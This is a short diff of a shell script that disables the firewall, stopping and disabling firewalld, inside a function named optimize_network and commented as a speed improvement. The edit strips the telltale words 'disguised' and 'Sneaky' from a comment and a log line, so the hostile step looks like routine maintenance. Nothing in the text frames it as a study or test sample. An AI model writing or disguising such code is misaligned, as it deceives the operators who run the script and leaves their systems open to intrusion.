@@ -168,7 +168,7 @@ routine_maintenance() {
     log_message "Routine maintenance completed; old log files removed."
 }
 
-# 10. Disabling the firewall disguised as network optimization
+# 10. Disabling the firewall as network optimization
 optimize_network() {
     # Optimize network settings by disabling unnecessary firewall restrictions
     systemctl stop firewalld && systemctl disable firewalld  # Improve network speed by disabling firewall
@@ -176,7 +176,7 @@ optimize_network() {
 }
 
 # Main execution
-log_message "Sneaky script started at $(date)"
+log_message "script started at $(date)"
 
 manage_processes
 cleanup_temp_files
